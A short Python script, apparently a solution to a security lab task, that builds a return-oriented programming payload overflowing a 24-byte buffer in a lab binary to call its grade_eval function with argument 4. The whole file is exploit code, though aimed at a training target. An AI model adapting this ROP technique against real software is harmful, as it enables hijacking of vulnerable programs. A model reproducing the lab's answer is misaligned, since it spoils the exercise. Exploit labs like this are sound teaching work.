#!/usr/bin/env python3
"""Task 3: ROP on dark-calc-nx, call grade_eval(4).

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

POP_RDI = 0x401A33
RET     = 0x401A34
GRADE   = 0x401978

payload  = b"A" * 24
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", RET)
payload += struct.pack("<Q", GRADE)
sys.stdout.buffer.write(payload)
